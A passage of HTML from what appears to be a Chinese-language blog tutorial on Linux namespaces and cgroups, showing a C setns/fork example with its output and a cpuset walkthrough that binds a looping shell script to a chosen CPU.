class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpid</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-52\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Setns */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-55\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sprintf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/proc/%d/ns/pid\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">O_RDONLY</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-57\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-58\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"open error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">setns</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// setns并不会改变当前进程的命名空间, 而是会设置之后创建的子进程的命名空间</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"setns error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">npid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-65\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">npid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-66\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"fork error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">npid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-68\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"I am child process. My pid is %d  \\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-69\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 新的子进程会被加入到第一个子进程的pid命名空间中, 所以其pid应该为2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">exit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-72\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-74\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0084 seconds] -->\r\n<p>运行结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e34886389587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo ./ns\r\nI'm child process and my pid is 1 \r\nI am child process. My pid is 1  \r\nI am child process. My pid is 2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e34886389587-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e34886389587-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e34886389587-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e34886389587-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e34886389587-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">ns</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e34886389587-2\"><span class=\"crayon-i\">I</span>'<span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">process </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">my </span><span class=\"crayon-e\">pid </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e34886389587-3\"><span class=\"crayon-i\">I</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">am </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">process</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">My </span><span class=\"crayon-e\">pid </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e34886389587-4\"><span class=\"crayon-i\">I</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">am </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">process</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">My </span><span class=\"crayon-e\">pid </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p></p>\n<h1>控制组(Cgroups)<br>\n<span id=\"OSC_h1_4\"></span></h1>\n<h1></h1>\n<p>如果说命名空间是从命名和编号的角度进行隔离，而控制组则是将进程进行分组，并真正的将各组进程的计算资源进行限制、隔离。控制组是一种内核机制，它可以对进程进行分组、跟踪限制其使用的计算资源。对于每一类计算资源，控制组通过所谓的子系统(subsystem)来进行控制，现阶段已有的子系统包括：</p>\n<ul>\n<li>cpusets: 用来分配一组CPU给指定的cgroup，该cgroup中的进程只等被调度到该组CPU上去执行</li>\n<li>blkio : 限制cgroup的块IO</li>\n<li>cpuacct : 用来统计cgroup中的CPU使用</li>\n<li>devices : 用来黑白名单的方式控制cgroup可以创建和使用的设备节点</li>\n<li>freezer : 用来挂起指定的cgroup，或者唤醒挂起的cgroup</li>\n<li>hugetlb : 用来限制cgroup中hugetlb的使用</li>\n<li>memory : 用来跟踪限制内存及交换分区的使用</li>\n<li>net_cls : 用来根据发送端的cgroup来标记数据包，流量控制器(traffic controller)会根据这些标记来分配优先级</li>\n<li>net_prio : 用来设置cgroup的网络通信优先级</li>\n<li>cpu :用来设置cgroup中CPU的调度参数</li>\n<li>perf_event : 用来监控cgroup的CPU性能</li>\n</ul>\n<p>与命名空间不同，控制组并没有增加系统调用，而是实现了一个文件系统，通过文件及目录操作来管理控制组。下面通过一个例子来看一看cgroup是如何利用cpuset子系统来把进程绑定到指定的CPU上去执行的。</p>\n<p>1. 创建一个一直执行的shell脚本</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e3b077127633\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/bash\r\n\r\nx=0\r\n\r\nwhile [ True ];do\r\n    :\r\ndone;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e3b077127633-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e3b077127633-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e3b077127633-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e3b077127633-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e3b077127633-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e3b077127633-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e3b077127633-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e3b077127633-1\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e3b077127633-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e3b077127633-3\"><span class=\"crayon-v\">x</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e3b077127633-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e3b077127633-5\"><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e3b077127633-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e3b077127633-7\"><span class=\"crayon-v\">done</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>2. 在后台执行这个脚本</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e40300843625\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# bash run.sh &amp;\r\n[1] 20553</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e40300843625-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e40300843625-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e40300843625-1\"><span class=\"crayon-p\"># bash run.sh &amp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e40300843625-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20553</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>3. 查看该脚本在哪个CPU上运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e43197230684\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep\r\nroot     20553   3 bash run.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e43197230684-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e43197230684-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e43197230684-1\"><span class=\"crayon-p\"># ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e43197230684-2\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">20553</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bash </span><span class=\"crayon-v\">run</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>可以看到PID为20553的进程运行在编号为3的CPU上，下面利用cgroups将其绑定到编号为2的CPU上去执行</p>\n<p>4. 挂载cgroups类型的文件系统到一个新创建的目录cgroups中</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e46737722372\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mkdir cgroups\r\n# mount -t cgroup -o cpuset cgroups ./cgroups/\r\n# ls cgroups/\r\ncgroup.clone_children   cpuset.memory_pressure_enabled\r\ncgroup.procs            cpuset.memory_spread_page\r\ncgroup.sane_behavior    cpuset.memory_spread_slab\r\ncpuset.cpu_exclusive    cpuset.mems\r\ncpuset.cpus             cpuset.sched_load_balance\r\ncpuset.effective_cpus   cpuset.sched_relax_domain_level\r\ncpuset.effective_mems   docker\r\ncpuset.mem_exclusive    tasks\r\ncpuset.mem_hardwall     notify_on_release\r\ncpuset.memory_migrate   release_agent\r\ncpuset.memory_pressure</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e46737722372-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e46737722372-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e46737722372-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e46737722372-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e46737722372-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e46737722372-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e46737722372-13\">13</div><div class=\"crayon-num crayon-striped-num\" 